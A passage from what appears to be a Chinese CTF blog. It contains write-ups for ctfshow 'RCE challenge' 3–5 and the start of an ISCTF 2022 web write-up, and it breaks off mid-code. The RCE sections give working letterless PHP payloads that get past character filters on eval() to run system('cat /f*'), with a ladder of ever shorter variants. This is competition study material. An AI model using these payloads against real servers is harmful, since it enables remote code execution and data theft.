class="string">&#x27;__&#x27;</span>]);<span class="comment">//($_GET[&#x27;_&#x27;])($_GET[&#x27;__&#x27;])</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?_=system&amp;__=cat /f*</span><br><span class="line">ctf_show=%24_%3D%5B%5D%3B%24_%20%3D%20&#x27;&#x27;.%24_%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%3B&#x27;%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_.%24__%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D&#x27;_&#x27;.%24__.%24_%3B(%24%24__%5B&#x27;_&#x27;%5D)(%24%24__%5B&#x27;__&#x27;%5D)%3B</span><br></pre></td></tr></table></figure><h2 id="RCE挑战3"><a href="#RCE挑战3" class="headerlink" title="RCE挑战3"></a>RCE挑战3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">105</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z2-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz后发现可用的可见字符有：</p><p>$ ( ) + , . &#x2F; 0 1 ; &#x3D; [ ] _  </p><p>并且代码长度限制要小于105。</p></blockquote><p>可以用数字0或者1，那么就可以通过(0&#x2F;0)来构造float型的NAN，(1&#x2F;0)来构造float型的INF，然后转换成字符串型，得到”NAN”和”INF”中的字符了，</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=((<span class="number">0</span>/<span class="number">0</span>)._)[<span class="number">0</span>]; <span class="comment">//这里是关键，php的计算上面有说，返回N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO。</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">0</span>]); <span class="comment">// $_POST[_]($_POST[0]);</span></span><br></pre></td></tr></table></figure><p>至于为什么使用POST，因为N下面就有post的所有字母，而且比较近，而且php的ascii不能自减，所以组GET要废很多时间。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=((0/0)._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战4"><a href="#RCE挑战4" class="headerlink" title="RCE挑战4"></a>RCE挑战4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">84</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z1-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>fuzz一下，发现可用的字符只有</p><p>$ ( ) + , . &#x2F; 0 ; &#x3D; [ ] _</p><p>要求长度小于84</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._)[<span class="number">0</span>]; <span class="comment">//更短的N</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>.<span class="variable">$_</span>++; </span><br><span class="line"><span class="comment">//这里是进行了++的，所以$_等于P, $__=PO.</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// Q</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$_</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$__</span>.<span class="variable">$_</span>.++<span class="variable">$_</span>; <span class="comment">//这里最后一个也是进行了++的，所以最后一位是T, $_ = _POST</span></span><br><span class="line"><span class="variable">$$_</span>[_](<span class="variable">$$_</span>[<span class="number">1</span>]); <span class="comment">// $_POST[_]($_POST[1]);</span></span><br></pre></td></tr></table></figure><p>RCE挑战3的playload也能用，但是又尝试压到了78个字符。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$_=(_/_._)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);&amp;_=system&amp;0=cat /f*</span><br></pre></td></tr></table></figure><h2 id="RCE挑战5"><a href="#RCE挑战5" class="headerlink" title="RCE挑战5"></a>RCE挑战5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$ctfshow</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ctfshow</span>) &lt;= <span class="number">73</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9!&#x27;@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;Are you hacking me AGAIN?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制73个字符，而且0也不可以用了</p><p><code>$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.++$_.++$_;$$_[_]($$_[0]);</code></p><p>重新fuzz，变量这边还能再缩，尝试一些希腊字符等不可见字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$%FF=<span class="title function_ invoke__">_</span>(%FF/%FF)[%FF];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$_</span>=++$%FF; <span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++$%FF.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line">$%FF++;<span class="comment">//Q</span></span><br><span class="line">$%FF++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++$%FF.++$%FF;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[%FF](<span class="variable">$$_</span>[_]);</span><br></pre></td></tr></table></figure><p>极限的73个字符。</p><p>看别的师傅的wp，PHP在做字符串拼接的过程中（.操作），是一个从左到右递归的过程，而<code>++</code>操作类似于一个函数，php在执行完函数后，再做拼接的操作，这里可以<code>$_=$a.$a++;</code>来拼接PO。</p><p>预期解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//相当于gettext(0/0)[0],得到N</span></span><br><span class="line"><span class="variable">$_</span>=++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=_.++<span class="variable">$a</span>.<span class="variable">$_</span>;<span class="comment">//_PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>.=++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><p>这里观察到phpinfo安装了一个扩展gettext，该扩展支持函数<code>_()</code> ,相当于<code>gettext()</code>，直接转化为字符串。另外，其实数组下标使用未定义常量，php会warning，但是可以继续运行，并返回下标为0的字符（现象是这样但是实际机制需要看php源码）。其余知识点上面都已经讲过了，剩下的就是靠经验和积累对payload进行精简。</p><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$%ff=_(%ff/%ff)[%ff];$_=%2b%2b$%ff;$_=_.%2b%2b$%ff.$_;$%ff%2b%2b;$%ff%2b%2b;$_.=%2b%2b$%ff.%2b%2b$%ff;$$_[_]($$_[%ff]);&amp;_=system&amp;%ff=cat /f*</span><br></pre></td></tr></table></figure><p>大佬们的不同长度playload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//246</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;($$___[_])($$___[__]);</span></span><br><span class="line"><span class="comment">//208</span></span><br><span class="line"><span class="comment">//$_=[].[];$__=&#x27;&#x27;;$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_=++$_;$__.=$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$__.=$_;$___=&#x27;_&#x27;;$___.=$__;$__=$$___;$__[&#x27;_&#x27;]($__[&#x27;__&#x27;]);</span></span><br><span class="line"><span class="comment">//176</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__.=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$__.=$_;$_=_.$__.++$_;($_[_])($_[__]);</span></span><br><span class="line"><span class="comment">//119</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$___=$_;$_++;$_++;$_++;$_=_.$___.$__.$_.++$_;($$_[_])($$_[__]);</span></span><br><span class="line"><span class="comment">//117</span></span><br><span class="line"><span class="comment">//$_=[].[];$_=$_[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//113</span></span><br><span class="line"><span class="comment">//$_=([].[])[&#x27;&#x27;];$_=($_/$_.$_)[&#x27;&#x27;];$_++;$__=$_;$_++;$__=$_.$__;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//109</span></span><br><span class="line"><span class="comment">//$_=([].[])[0];$_=($_/$_.$_)[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[1]);</span></span><br><span class="line"><span class="comment">//95</span></span><br><span class="line"><span class="comment">//$_=(0/0).[];$_=$_[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]);</span></span><br><span class="line"><span class="comment">//85</span></span><br><span class="line"><span class="comment">//$_=((0/0).[])[0];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[0]); </span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=((_/_).[])[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//82</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//79</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$_=_.$__.$_.++$_;$$_[_].$$_[__];</span></span><br><span class="line"><span class="comment">//78</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$α=$_.$_++;$_++;$_++;$_++;$_=_.$α.$_.++$_;$$_[_]($$_[__]);</span></span><br><span class="line"><span class="comment">//77</span></span><br><span class="line"><span class="comment">//$_=(_/_._)[_];$_++;$%FA=$_.$_++;$_++;$_++;$_=_.$%FA.++$_.++$_;$$_[_]($$_[%FA]);</span></span><br><span class="line"><span class="comment">//73</span></span><br></pre></td></tr></table></figure><p>62位写法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?PHP</span><br><span class="line">$_=_(%FA.%FA)[_];//N</span><br><span class="line">$%FA=++$_;//O</span><br><span class="line">$$%FA[$%FA=_.++$_.$%FA[$_++/$_++].++$_.++$_]($$%FA[_]); //$_POST[_POST]($_POST[_])</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> 自增 </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF 2022 Web WP</title>
      <link href="/posts/cbb4.html"/>
      <url>/posts/cbb4.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php弱类型比较。传入ISCTF&#x3D;114514a即可。</p><p>这里用到了PHP弱比较的知识</p><blockquote><p>&#x3D;&#x3D; ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。<br>&#x3D;&#x3D;&#x3D; ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p></blockquote><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p>打开链接一看很快就重定向到别的网站了，抓包看看。</p><p><img src="/posts/cbb4/image-20221105093638578.png" alt="image-20221105093638578"></p><p>看到一个奇怪的If-None-Match和ETag，补充下知识点：</p><p>ETag是HTTP1.1中才加入的一个属性，用来帮助服务器控制Web端的缓存验证。</p><blockquote><p>它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b”的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。</p></blockquote><p>大概意思是比较If-None-Match和ETag，如果两者不相等则重新返回资源，否则不返回。</p><p>我们将If-None-Match修改之后再发包。就得到了flag。</p><p><img src="/posts/cbb4/image-20221105093946826.png" alt="image-20221105093946826"></p><p>应该是个非预期吧，在sitemap里能看到burp爬过的记录，里面也能看到flag。</p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span 